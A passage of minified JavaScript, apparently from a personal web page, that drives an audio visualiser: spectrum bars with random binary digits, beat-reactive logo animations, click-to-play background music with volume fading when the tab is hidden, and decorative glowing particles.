rotate(${a}deg)`;let l=25+e*25,d=.6+e*.4;s.style.filter=`drop-shadow(0 0 ${l}px rgba(0, 162, 255, ${d}))`;let m=t>.5?.2:.25;e>m&&Math.random()>.75&&se(a)}}function pe(e,t,o){return Math.round(e/(t/2)*(o/2))}function ut(){if(!y||!v)return!1;y.getByteFrequencyData(v);let e=x.sampleRate,t=pe(1500,e,y.fftSize),o=pe(2250,e,y.fftSize),n=0,a=Math.max(1,o-t+1);for(let r=t;r<=o&&r<v.length;r++)n+=v[r];let s=n/a,i=188,c=Date.now();return s>i&&c-me>25?(me=c,!0):!1}function ft(){if(!L.length)return!1;let e=Date.now(),t=b(),o,n,a,s;H==="high"?(o=.35,n=7/10,a=50,s=250):(o=.45,n=9/10,a=100,s=300);let i=L.length,c=Math.floor(i*.25),r=Math.floor(i*o),l=L.slice(c,r),d=0;l.forEach(w=>{w.classList.contains("active")&&d++});let m=Math.max(1,Math.ceil(l.length*n)),p=d>=m;return N.push({time:e,isActive:p}),N=N.filter(w=>e-w.time<=a),N.filter(w=>w.isActive).length>0&&e-fe>s?(fe=e,!0):!1}function pt(){let e=document.getElementById("bgmAudio");if(!e.duration||!B||!h)return;let t=e.currentTime/e.duration,n=h.viewBox.baseVal.width||1e3;B.setAttribute("width",n*t)}function ie(){let e=document.getElementById("binarySpectrum"),t=b(),o=t.spectrumBarCount,n=t.spectrumBarWidth;if(e.innerHTML="",L=[],f&&o>10){let i=function(){let c=Math.min(a+s,o);for(let r=a;r<c;r++){let l=document.createElement("div");if(l.className="spectrum-bar",l.style.left=r*(100/o)+"%",l.style.height="0px",l.style.width=n+"px",t.enableBinaryDigits){let d=document.createElement("div");d.className="binary-digits",f&&H==="medium"&&d.classList.add("mobile-medium-digits");let m="",p=Math.floor(Math.random()*12)+8;for(let u=0;u<p;u++)m+=Math.random()>.5?"1":"0";d.textContent=m,l.appendChild(d)}e.appendChild(l),L.push(l)}a=c,a<o&&requestAnimationFrame(i)},a=0,s=Math.max(1,Math.floor(o/4));requestAnimationFrame(i)}else for(let a=0;a<o;a++){let s=document.createElement("div");if(s.className="spectrum-bar",s.style.left=a*(100/o)+"%",s.style.height="0px",s.style.width=n+"px",t.enableBinaryDigits){let i=document.createElement("div");i.className="binary-digits",f&&H==="medium"&&i.classList.add("mobile-medium-digits");let c="",r=Math.floor(Math.random()*12)+8;for(let l=0;l<r;l++)c+=Math.random()>.5?"1":"0";i.textContent=c,s.appendChild(i)}e.appendChild(s),L.push(s)}}function xe(){if(!y||!C)return;y.getByteFrequencyData(v),I&&M&&M.postMessage({type:"spectrumData",data:Array.from(v)});let e=x.sampleRate,t=document.getElementById("dataStreams"),o=document.getElementById("logoContainer"),n=document.getElementById("logo"),a=b();C&&a.enableDataStreamGlitch?(t.classList.remove("glitch-beat"),t.classList.add("glitch-subtle")):t.classList.remove("glitch-subtle","glitch-beat");let s=ft(),i=ut();s&&!k&&a.enableLogoBeats?(k=!0,o.classList.add("heavy-beats"),o.classList.add("activity"),dt(),[-12,-8,-4,0,4,8,12].forEach((r,l)=>{setTimeout(()=>se(r),l*20)}),setTimeout(()=>{k=!1,o.classList.remove("heavy-beats"),o.classList.remove("activity")},200)):i&&!A&&!k&&a.enableLogoBeats&&(A=!0,o.classList.add("activity"),n.style.animation="beatScale 0.4s cubic-bezier(0.34, 1.56, 0.64, 1) forwards",[-8,-4,0,4,8].forEach((r,l)=>{setTimeout(()=>se(r),l*30)}),lt(1),setTimeout(()=>{A=!1,n.style.animation="",o.classList.remove("activity")},400),a.enableDataStreamGlitch&&(t.classList.remove("glitch-subtle"),t.classList.add("glitch-beat"),setTimeout(()=>{C&&(t.classList.remove("glitch-beat"),t.classList.add("glitch-subtle"))},250))),mt(),ht(v),pt(),C&&requestAnimationFrame(xe)}function ht(e){if(!L.length)return;let t=L.length,o=Math.floor(e.length*.85),n=Math.floor(o/t);for(let a=0;a<t;a++){let s=a*n,i=e[s]||0,c=Math.max(5,i/255*100),r=L[a];r.classList.remove("stopping"),r.style.height=c+"px";let l=b();if(l.enableSpectrumHighlight&&(i>120?r.classList.add("active"):r.classList.remove("active"),l.enableBinaryDigits&&Math.random()>.92)){let d=r.querySelector(".binary-digits");if(d){let m="",p=Math.floor(Math.random()*12)+8;for(let u=0;u<p;u++)m+=Math.random()>.5?"1":"0";d.textContent=m}}}}function Se(){document.getElementById("dataStreams").classList.remove("glitch-subtle","glitch-beat"),L.forEach((t,o)=>{t.classList.add("stopping"),t.classList.remove("active"),setTimeout(()=>{t.style.height="0px",setTimeout(()=>{let n=t.querySelector(".binary-digits");n&&(n.textContent="")},400)},o*20)})}function O(e){let t=document.getElementById("audioStatus");switch(t.classList.remove("blink","show","hidden"),e){case"initial":t.textContent="\u70B9\u51FB LOGO \u64AD\u653E BGM",t.classList.add("blink");break;case"playing":t.classList.add("hidden");break;case"paused":t.textContent="\u70B9\u51FB LOGO \u7EE7\u7EED\u64AD\u653E",t.classList.add("show");break;default:t.classList.add("hidden")}}function gt(){let e=document.getElementById("bgmAudio"),t=document.getElementById("logoContainer"),o=document.getElementById("logo");if(C)C=!1,e.pause(),t.classList.remove("playing","activity","heavy-beats"),O("paused"),o.style.transform="",o.style.animation="",A=!1,k=!1,N=[],P(),requestAnimationFrame(()=>{Se(),I&&M&&M.postMessage({type:"stop"})});else{if(!x&&!at()){O("initial");return}x.state==="suspended"&&x.resume(),e.play().then(()=>{C=!0,t.classList.add("playing"),O("playing"),document.getElementById("dataStreams").classList.remove("glitch-subtle","glitch-beat"),xe()}).catch(n=>{O("initial")})}}function yt(){let e=document.getElementById("logoContainer"),t=document.getElementById("logo");C=!1,e.classList.remove("playing","activity","heavy-beats"),t.style.transform="",t.style.animation="",A=!1,k=!1,N=[],B&&B.setAttribute("width","0"),P(),requestAnimationFrame(()=>{Se()}),O("initial")}var he;window.addEventListener("resize",()=>{clearTimeout(he),he=setTimeout(()=>{f=window.innerWidth<768,ie(),X()},300)});document.addEventListener("visibilitychange",function(){let e=document.getElementById("bgmAudio");if(document.hidden&&C){let t=e.volume,o=.15,n=600,a=20,s=(t-o)/a,i=n/a,c=0,r=setInterval(()=>{c++,e.volume=Math.max(o,t-s*c),c>=a&&(clearInterval(r),e.volume=o)},i)}else if(!document.hidden&&C){let t=e.volume,o=1,n=350,a=20,s=(o-t)/a,i=n/a,c=0,r=setInterval(()=>{c++,e.volume=Math.min(o,t+s*c),c>=a&&(clearInterval(r),e.volume=o)},i)}});function wt(){let e=Date.now();if(document.querySelector(".tech-particle-burst")||e-le<ze)return;le=e;let t=document.createElement("div");t.className="tech-particle-burst",document.body.appendChild(t);let n=document.getElementById("mainFooter").getBoundingClientRect(),a=n.top,s=n.left,i=n.width,r=b().particleCount;for(let l=0;l<r;l++){let d=document.createElement("div");d.className="tech-particle";let m=s+Math.random()*i,p=a+Math.random()*8;d.style.left=m+"px",d.style.top=p+"px",d.style.animationDelay=Math.random()*.4+"s";let u=2+Math.random()*3;d.style.width=u+"px",d.style.height=u+"px";let w=["#00e4ff","#00a2ff","#66ccff","#0099ff","#007acc","#4a90e2"],g=w[Math.floor(Math.random()*w.length)];d.style.background=g,d.style.boxShadow=`0 0 8px ${g}, 0 0 16px ${g}80`;let re=(Math.random()-.5)*20;d.style.setProperty("--horizontal-offset",re+"px"),t.appendChild(d)}setTimeout(()=>{t.parentNode&&t.parentNode.removeChild(t)},1500)}var K=null,E=null;function bt(){Be(),E=document.createElement("div"),E.className="easter-egg-particle-container",E.style.cssText=`
        position: fixed;
        bottom: 0;
        left: 0;
        width: 100%;
        height: 100%;
        pointer-events: none;
        z-index: 1002;
        overflow: hidden;
    `,document.body.appendChild(E),K=setInterval(()=>{vt()},800)}function Be(){K&&(clearInterval(K),K=null),E&&(E.parentNode&&E.parentNode.removeChild(E),E=null)}function vt(){if(!E)return;let e=document.createElement("div");e.className="easter-egg-particle";let t=Math.random()*window.innerWidth,o=window.innerHeight-Math.random()*20;e.style.left=t+"px",e.style.top=o+"px";let n=(Math.random()-.5)*40;e.style.setProperty("--horizontal-offset",n+"px");let a=1.5+Math.random()*2.5;e.style.width=a+"px",e.style.height=a+"px";let s=["#00e4ff","#00a2ff","#66ccff","#0099ff","#33bbff","#00ccff"],i=s[Math.floor(Math.random()*s.length)];e.style.background=i,e.style.boxShadow=`0 0 4px ${i}, 0 0 8px rgba(0, 228, 255, 0.3)`,e.style.animation="easterEggParticleFloat 6s ease-out forwards",E.appendChild(e),setTimeout(()=>{e.parentNode&&e.parentNode.removeChild(e)},6e3)}})();
